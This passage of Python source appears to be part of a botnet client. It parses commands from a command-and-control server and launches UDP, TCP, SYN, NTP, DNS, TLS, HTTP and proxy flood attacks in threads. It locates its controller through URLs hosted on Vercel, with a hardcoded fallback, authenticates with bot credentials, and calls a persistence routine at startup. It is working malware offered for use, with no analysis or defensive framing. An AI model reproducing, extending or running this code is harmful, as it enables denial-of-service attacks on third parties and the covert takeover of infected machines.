        if active_attacks_count < 0: active_attacks_count = 0
        print(f"[{thread_name}] Command dispatch finished.")


# --- Command Mapping and Dispatch ---

COMMAND_MAP = {
    ".UDP": (udp_method, [str, int, int]),
    ".TCP": (tcp_method, [str, int, int]),
    ".SYN": (syn_method, [str, int, int]),
    ".NTP": (ntp_method, [str, int, int]),
    ".DNS": (dns_method, [str, str, int]),
    ".SSH-SPAM": (ssh_spam_method, [str, int]),

    ".HTTPGET": (httpget_method, [str, int, int]),

    ".TLS": (tls_method, [str, int]),
    ".MC": (mc_method, [str, int]),

    ".UDPGAME": (udpgame_method, [str, int, int]),

    ".HTTPPROXY": (httpproxy_method, [str, int]),
}


def parse_and_run_command(command_string):
    """Parses a command string received from CNC and runs the attack workers."""
    global attack_threads
    system_info = detect_system()

    try:
        args = command_string.split(' ')
        if not args or not args[0].strip():
            return

        command_name = args[0].strip().upper()

        if command_name in COMMAND_MAP:
            attack_func, arg_types = COMMAND_MAP[command_name]

            expected_args_count = len(arg_types)
            is_udp = command_name == ".UDP"
            has_udp_size_param = is_udp and "-bytes" in args

            if has_udp_size_param:
                 try:
                      bytes_flag_index = args.index("-bytes")
                      requested_size_str = args[bytes_flag_index + 1]
                      temp_args = args[:bytes_flag_index] + args[bytes_flag_index + 2:]
                      if len(temp_args) - 1 < expected_args_count:
                           print(f"Received incomplete .UDP command with -bytes: {command_string}. Expected {expected_args_count} base args, got {len(temp_args) - 1}.")
                           return
                 except (ValueError, IndexError):
                      print(f"Invalid .UDP command with -bytes format: {command_string}. Missing size after -bytes.")
                      return
            else:
                 if len(args) - 1 < expected_args_count:
                     print(f"Received incomplete command: {command_string}. Expected {expected_args_count} args, got {len(args) - 1}.")
                     return

            parsed_args = []
            current_arg_index = 1

            try:
                for i, arg_type in enumerate(arg_types):
                    if current_arg_index >= len(args):
                         print(f"Error parsing arguments for command {command_name}: Ran out of arguments.")
                         return

                    arg_value_str = args[current_arg_index].strip()

                    if is_udp and arg_value_str == "-bytes":
                         if current_arg_index + 1 >= len(args):
                              print(f"Invalid .UDP command: -bytes flag found without a size.")
                              return
                         requested_large_size_str = args[current_arg_index + 1].strip()
                         current_arg_index += 2
                         if current_arg_index >= len(args) and i < len(arg_types) -1:
                              print(f"Invalid .UDP command: Arguments missing after -bytes flag.")
                              return
                         continue

                    if arg_type == str:
                        parsed_args.append(arg_value_str)
                    elif arg_type == int:
                         try:
                            parsed_args.append(int(arg_value_str))
                         except ValueError:
                              print(f"Invalid argument type for command {command_name}: Expected integer for argument {i+1}, got '{arg_value_str}'.")
                              return
                    else:
                        print(f"Unknown argument type {arg_type} defined for command {command_name}. Skipping.")
                        return

                    current_arg_index += 1

                if current_arg_index < len(args) and not has_udp_size_param:
                     print(f"Received command with unexpected extra arguments: {command_string}")


            except (ValueError, IndexError) as e:
                print(f"Error parsing arguments for command {command_string}: {e}. Check command syntax.")
                return

            # --- Append fixed parameters, external lists, and capability flags implicitly ---

            final_bot_args = list(parsed_args)

            if command_name in [".UDP", ".TCP", ".SSH-SPAM", ".MC", ".UDPGAME"]:
                 size_to_pass = DEFAULT_PACKET_SIZE
                 if command_name == ".UDP" and has_udp_size_param:
                      try:
                           requested_large_size = int(requested_large_size_str)
                           if 1 <= requested_large_size <= LARGE_PACKET_SIZE:
                                size_to_pass = requested_large_size
                           else:
                                print(f"Warning: Invalid size {requested_large_size_str} requested for UDP. Using default {DEFAULT_PACKET_SIZE}.")
                      except ValueError:
                           print(f"Warning: Invalid size format {requested_large_size_str} for UDP -bytes. Using default {DEFAULT_PACKET_SIZE}.")
                 final_bot_args.append(size_to_pass)

            if command_name == ".UDP":
                 final_bot_args.append(system_info.get('has_root', False))
            elif command_name in [".SYN", ".NTP", ".DNS"]:
                 final_bot_args.append(SCAPY_AVAILABLE)
            elif command_name == ".TLS":
                 final_bot_args.append(SSL_AVAILABLE)
                 final_bot_args.append(REQUESTS_AVAILABLE)
            elif command_name == ".HTTPGET":
                 final_bot_args.append(CLOUDSCRAPER_AVAILABLE and REQUESTS_AVAILABLE)
                 final_bot_args.append(REQUESTS_AVAILABLE)
            elif command_name == ".HTTPPROXY":
                 final_bot_args.append(external_lists['http_proxies'])
                 final_bot_args.append(REQUESTS_AVAILABLE)


            # Run the attack function in a new thread using the wrapper
            target_arg_for_name = "N/A"
            if len(args) > 1:
                 if command_name == ".DNS" and len(args) > 2:
                     target_arg_for_name = args[2].strip()
                 else:
                     target_arg_for_name = args[1].strip()


            thread_name = f"{command_name}-{target_arg_for_name}-{int(time.time())}"
            attack_thread = threading.Thread(target=_attack_thread_wrapper,
                                             args=(attack_func, *final_bot_args),
                                             name=thread_name)
            attack_thread.daemon = True
            attack_thread.start()
            attack_threads.append(attack_thread)
            print(f"Dispatched command to thread: {command_string}")

        else:
            print(f"Received unknown command: {command_name}")

    except Exception as e:
        print(f"Error processing command string '{command_string}': {e}")
        import traceback
        traceback.print_exc()


# --- Bot Status Reporting ---
def print_bot_status():
    """Periodically prints bot status to the console."""
    while True:
        try:
            global attack_threads
            attack_threads = [t for t in attack_threads if t.is_alive()]
            num_tracked_attack_threads = len(attack_threads)

            uptime_seconds = int(time.time() - start_time)
            m, s = divmod(uptime_seconds, 60)
            h, m = divmod(m, 60)
            uptime_str = f"{h:d}h {m:02d}m {s:02d}s"

            status = "Connected" if cnc_socket is not None else "Disconnected"
            current_target = "N/A"
            if cnc_socket:
                 try:
                      sock_ip, sock_port = cnc_socket.getpeername()
                      current_target = f"{sock_ip}:{sock_port}"
                 except Exception:
                      pass

            connection_type = "N/A"
            if cnc_socket:
                 try:
                      sock_ip, sock_port = cnc_socket.getpeername()
                      if VERCEL_C2_ADDRESS and sock_ip == VERCEL_C2_ADDRESS and sock_port == VERCEL_C2_PORT:
                           connection_type = "Vercel"
                      elif sock_ip == FALLBACK_C2_ADDRESS and sock_port == FALLBACK_C2_PORT:
                           connection_type = "Fallback"
                      else:
                           connection_type = "Other"
                 except Exception:
                      pass

            print(f"[STATUS] {status} | Target: {current_target} ({connection_type}) | Uptime: {uptime_str} | Active Commands: {active_attacks_count} | Dispatcher Threads: {num_tracked_attack_threads} | Workers/Command: {FIXED_THREAD_COUNT}")


        except Exception as e:
            print(f"[STATUS] Error printing status: {e}")
            import traceback
            traceback.print_exc()
        time.sleep(60)


# --- CNC Connection Management ---

def fetch_vercel_info():
    """Attempts to fetch Vercel IP and Port."""
    global VERCEL_C2_ADDRESS, VERCEL_C2_PORT, LAST_VERCEL_CHECK_TIME
    LAST_VERCEL_CHECK_TIME = time.time()

    if not REQUESTS_AVAILABLE:
        VERCEL_C2_ADDRESS = None
        VERCEL_C2_PORT = None
        return False

    try:
        ip_response = requests.get(VERCEL_IP_FETCH_URL, timeout=5)
        port_response = requests.get(VERCEL_PORT_FETCH_URL, timeout=5)

        new_ip = None
        new_port = None

        if ip_response.status_code == 200:
            new_ip = ip_response.text.strip()
            if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", new_ip):
                 print(f"Warning: Invalid IP format received from Vercel: {new_ip}")
                 new_ip = None

        if port_response.status_code == 200:
            try:
                 new_port = int(port_response.text.strip())
                 if not (1 <= new_port <= 65535):
                      print(f"Warning: Invalid port number received from Vercel: {new_port}")
                      new_port = None
            except ValueError:
                 print(f"Warning: Invalid port format received from Vercel: {port_response.text.strip()}")
                 new_port = None

        if new_ip and new_port:
            VERCEL_C2_ADDRESS = new_ip
            VERCEL_C2_PORT = new_port
            return True
        else:
            VERCEL_C2_ADDRESS = None
            VERCEL_C2_PORT = None
            return False

    except requests.exceptions.RequestException as e:
        VERCEL_C2_ADDRESS = None
        VERCEL_C2_PORT = None
        return False
    except Exception as e:
        print(f"Unexpected error fetching Vercel info: {e}")
        import traceback
        traceback.print_exc()
        VERCEL_C2_ADDRESS = None
        VERCEL_C2_PORT = None
        return False


def attempt_connect(address, port, timeout=10):
    """Attempts to create and return a connected socket."""
    s = None
    try:
        print(f"Attempting to connect to {address}:{port}...")
        s = socket.create_connection((address, port), timeout=timeout)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        s.settimeout(None)
        print(f"Successfully connected to {address}:{port}.")
        return s
    except (socket.error, socket.timeout) as e:
        if s: s.close()
        return None
    except Exception as e:
        print(f"Unexpected error during connection to {address}:{port}: {e}")
        import traceback
        traceback.print_exc()
        if s: s.close()
        return None


def perform_authentication(sock):
    """Performs the bot authentication sequence on a connected socket."""
    try:
        print("Performing authentication...")
        sock.sendall(BOT_AUTH_STRING + b'\r\n')

        sock.settimeout(2)
        try: sock.recv(1024)
        except socket.timeout: pass
        finally: sock.settimeout(None)

        sock.sendall(EXPECTED_BOT_USERNAME + b'\r\n')

        sock.settimeout(2)
        try: sock.recv(1024)
        except socket.timeout: pass
        finally: sock.settimeout(None)

        sock.sendall(EXPECTED_BOT_PASSWORD)

        print("Authentication sequence sent.")
        return True
    except (socket.error, socket.timeout) as e:
        print(f"Authentication failed: {e}")
        return False
    except Exception as e:
        print(f"Unexpected error during authentication: {e}")
        import traceback
        traceback.print_exc()
        return False


def vercel_check_background_thread():
    """Periodically checks Vercel when connected to the fallback."""
    global VERCEL_C2_ADDRESS, VERCEL_C2_PORT, USE_VERCEL, LAST_VERCEL_CHECK_TIME, cnc_socket
    while True:
        if not USE_VERCEL and (time.time() - LAST_VERCEL_CHECK_TIME) >= VERCEL_CHECK_INTERVAL:
            if fetch_vercel_info() and VERCEL_C2_ADDRESS and VERCEL_C2_PORT:
                 temp_sock = attempt_connect(VERCEL_C2_ADDRESS, VERCEL_C2_PORT, timeout=5)
                 if temp_sock:
                      print("Background: Vercel is reachable. Signaling switch.")
                      try: temp_sock.close()
                      except: pass
                      USE_VERCEL = True
                      switch_connection_event.set()
                 else:
                      pass
            else:
                 pass

        time.sleep(min(VERCEL_CHECK_INTERVAL, 60))


def connection_manager():
    """Manages connecting to the CNC using prioritized Vercel/Fallback logic."""
    global cnc_socket, USE_VERCEL, VERCEL_C2_ADDRESS, VERCEL_C2_PORT

    if not any(t.name == "VercelCheckThread" for t in threading.enumerate()):
        vercel_checker = threading.Thread(target=vercel_check_background_thread, name="VercelCheckThread")
        vercel_checker.daemon = True
        vercel_checker.start()

    while True:
        switch_connection_event.clear()

        if USE_VERCEL:
            if VERCEL_C2_ADDRESS is None or VERCEL_C2_PORT is None:
                fetch_vercel_info()

            if VERCEL_C2_ADDRESS and VERCEL_C2_PORT:
                sock = attempt_connect(VERCEL_C2_ADDRESS, VERCEL_C2_PORT, timeout=10)
                if sock:
                    if perform_authentication(sock):
                        print("Connected and authenticated via Vercel.")
                        cnc_socket = sock
                        USE_VERCEL = True
                        return

            print("Vercel connection failed. Falling back to hardcoded...")
            USE_VERCEL = False
            LAST_VERCEL_CHECK_TIME = time.time()

        sock = attempt_connect(FALLBACK_C2_ADDRESS, FALLBACK_C2_PORT, timeout=10)
        if sock:
             if perform_authentication(sock):
                 print("Connected and authenticated via Fallback.")
                 cnc_socket = sock
                 USE_VERCEL = False
                 return

        print("Both Vercel and Fallback connections failed. Retrying...")
        time.sleep(15)


def main_bot_loop():
    """Main loop for the bot to manage connection and receive commands."""
    global cnc_socket

    print("Bot starting initial setup...")
    system_info = detect_system()
    print(f"System Info: OS={system_info['os']}, Arch={system_info['architecture']}, Distro={system_info['distro']}, IoT={system_info['is_iot']}, Root={system_info['has_root']}")
    add_persistence(system_info)
    load_external_lists() # This now attempts downloads

    status_thread = threading.Thread(target=print_bot_status, name="StatusThread")
    status_thread.daemon = True
    status_thread.start()

    while True:
        if cnc_socket is None:
            connection_manager()

        if cnc_socket is None:
             time.sleep(5)
             continue

        try:
            cnc_socket.settimeout(0.5)
            while cnc_socket is not None:
                try:
                    data = cnc_socket.recv(1024)
                    if not data:
                        print("Disconnected from CNC (no data received).")
                        break

                    command_string = data.decode('utf-8', errors='ignore').strip()

                    if not command_string:
                         continue

                    if command_string.upper() == 'PING':
                        try:
                            cnc_socket.sendall(b'PONG\r\n')
                        except socket.error as e:
                             print(f"Error sending PONG: {e}. Disconnecting.")
                             break
                        continue

                    parse_and_run_command(command_string)

                except socket.timeout:
                    if switch_connection_event.is_set():
                         print("Switch connection event received. Disconnecting current connection.")
                         break
                    pass
                except ConnectionResetError:
                    print("Connection reset by peer.")
                    break
                except socket.error as e:
                    print(f"Socket error during receive: {e}.")
                    break
                except Exception as e:
                    print(f"Unexpected error during receive or command processing: {e}.")
                    import traceback
                    traceback.print_exc()
                    break

            print("Closing current CNC connection.")
            try:
                 if cnc_socket: cnc_socket.close()
            except: pass
            cnc_socket = None

        except Exception as e:
            print(f"Critical error in main connection/receive loop: {e}")
            import traceback
            traceback.print_exc()
            try:
                 if cnc_socket: cnc_socket.close()
            except: pass
            cnc_socket = None
            time.sleep(5)


# --- Main Execution Block ---

if __name__ == "__main__":
    print("Bot starting...")
    try:
        main_bot_loop()
    except KeyboardInterrupt:
        print("\nBot stopped manually.")
    except Exception as e:
        print(f"Critical error in main execution: {e}")
        import traceback
        traceback.print_exc()
